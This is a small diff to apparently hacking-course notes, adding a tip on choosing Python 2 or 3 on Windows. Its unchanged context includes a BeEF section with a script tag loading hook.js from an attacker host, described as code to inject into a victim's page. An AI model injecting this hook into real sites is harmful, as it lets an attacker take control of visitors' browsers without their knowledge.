@@ -26,6 +26,10 @@ To enable a basic HTTP server, type:
 ### Python
 It seems that *netfilterqueue* does not work on Python 3.x.
 
+On Windows, while having both Python 2 and 3 installed, we can force to run either version by running:  
+`py -<version> <name_of_script_file>`  
+where `<version>` can be '2' or '3'.
+
 ### BeEF
 The code we want to inject into our victim is:  
 `<script src="http://<IP>:3000/hook.js"></script`,  
